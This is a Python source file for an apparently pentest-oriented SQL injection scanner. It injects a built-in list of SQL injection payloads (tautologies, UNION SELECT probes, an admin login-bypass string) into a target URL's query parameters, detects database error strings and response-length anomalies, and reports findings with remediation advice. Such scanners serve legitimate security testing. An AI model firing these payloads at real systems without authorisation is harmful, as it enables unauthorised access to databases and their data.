"""
SQL Injection Scanner
Detects SQL injection vulnerabilities in web applications
"""

import asyncio
from typing import Dict, List, Optional
import httpx
import structlog
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

logger = structlog.get_logger()


class SQLInjectionScanner:
    """SQL Injection vulnerability scanner"""
    
    # SQL injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    
    # SQL error patterns
    SQL_ERRORS = [
        "SQL syntax",
        "mysql_fetch",
        "mysqli",
        "mysql_query",
        "pg_query",
        "ORA-",
        "Microsoft SQL",
        "ODBC SQL",
        "SQLite",
        "PostgreSQL",
        "Warning: mysql",
        "valid MySQL result",
        "MySqlClient",
        "SQL Server",
        "Unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    
    def __init__(self):
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
    
    async def scan(
        self,
        target_url: str,
        auth_token: Optional[str] = None
    ) -> List[Dict]:
        """
        Scan for SQL injection vulnerabilities
        
        Tests various SQL injection payloads and detects error-based SQL injection
        """
        vulnerabilities = []
        
        try:
            logger.info("sql_scan_start", target=target_url)
            
            # Get base response
            headers = self._build_headers(auth_token)
            base_response = await self.client.get(target_url, headers=headers)
            base_content = base_response.text
            base_length = len(base_content)
            
            # Parse URL and test parameters
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                logger.info("sql_scan_no_params", target=target_url)
                return vulnerabilities
            
            # Test each parameter with SQL payloads
            for param_name in query_params:
                for payload in self.SQL_PAYLOADS:
                    vuln = await self._test_payload(
                        target_url,
                        param_name,
                        payload,
                        base_length,
                        headers
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Move to next parameter after finding vulnerability
            
            logger.info(
                "sql_scan_complete",
                vulnerabilities_found=len(vulnerabilities)
            )
            
        except Exception as e:
            logger.error("sql_scan_failed", error=str(e))
        finally:
            await self.client.aclose()
        
        return vulnerabilities
    
    async def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        base_length: int,
        headers: Dict
    ) -> Optional[Dict]:
        """Test a single SQL injection payload"""
        
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # Inject payload into parameter
            test_params = query_params.copy()
            test_params[param] = [payload]
            
            # Rebuild URL with injected payload
            test_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            
            # Send request
            response = await self.client.get(test_url, headers=headers)
            
            # Check for SQL errors in response
            for error_pattern in self.SQL_ERRORS:
                if error_pattern.lower() in response.text.lower():
                    logger.warning(
                        "sql_injection_detected",
                        url=url,
                        param=param,
                        payload=payload,
                        error_pattern=error_pattern
                    )
                    
                    return {
                        "type": "sql_injection",
                        "name": "SQL Injection",
                        "description": f"SQL injection vulnerability detected in parameter '{param}'",
                        "severity": "critical",
                        "cvss_score": 9.8,
                        "url": url,
                        "method": "GET",
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"SQL error pattern found: {error_pattern}",
                        "solution": "Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and sanitization.",
                        "reference": "https://owasp.org/www-community/attacks/SQL_Injection",
                        "cwe_id": "CWE-89",
                        "remediation": [
                            "Use prepared statements with parameterized queries",
                            "Implement input validation and sanitization",
                            "Use stored procedures",
                            "Escape all user input",
                            "Use ORM frameworks with built-in protection",
                            "Apply principle of least privilege to database accounts"
                        ]
                    }
            
            # Check for response length anomalies (blind SQL injection)
            response_length = len(response.text)
            if abs(response_length - base_length) > base_length * 0.3:
                logger.warning(
                    "potential_blind_sqli",
                    url=url,
                    param=param,
                    payload=payload,
                    length_diff=response_length - base_length
                )
                
                return {
                    "type": "sql_injection_blind",
                    "name": "Potential Blind SQL Injection",
                    "description": f"Potential blind SQL injection in parameter '{param}' (response length anomaly)",
                    "severity": "high",
                    "cvss_score": 8.6,
                    "url": url,
                    "method": "GET",
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Response length changed significantly: {response_length - base_length} bytes",
                    "solution": "Use parameterized queries and implement proper input validation",
                    "reference": "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                    "cwe_id": "CWE-89",
                    "remediation": [
                        "Use prepared statements with parameterized queries",
                        "Implement robust input validation",
                        "Use WAF to detect and block SQL injection attempts"
                    ]
                }
        
        except Exception as e:
            logger.debug("payload_test_error", param=param, payload=payload, error=str(e))
        
        return None
    
    def _build_headers(self, auth_token: Optional[str]) -> Dict:
        """Build HTTP headers with optional authentication"""
        headers = {
            "User-Agent": "BSU-PentestAgent/1.0"
        }
        
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        
        return headers
